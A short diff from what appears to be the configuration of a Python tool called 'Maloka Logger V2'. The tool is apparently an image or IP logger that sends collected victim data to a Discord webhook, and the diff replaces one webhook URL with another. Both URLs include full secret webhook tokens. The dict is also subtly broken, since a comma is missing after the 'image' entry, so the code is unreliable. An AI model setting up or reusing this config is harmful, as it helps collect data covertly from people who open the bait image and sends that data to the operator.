@@ -9,7 +9,7 @@ __author__ = "YoshiDevs"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1094334971155587192/inUax9d-7gYx29RAQXRR9_GCK3R27Yl6TJIFZxv3S3hDIZUqOy_HFQc5Sp8wQRSC2KCN",
+    "webhook": "https://discord.com/api/webhooks/1152675299524346066/1xolv240jxLOCADC9fE7wz7y3YjyrOTnya63ef72eGDbxHqMji4-QyRZkUcYrtYnlES3",
     "image": "https://i.imgur.com/bEAPHYOl.jpg"
     # CUSTOMIZATION #
     "username": "Maloka Logger V2", # Set this to the name you want the webhook to have
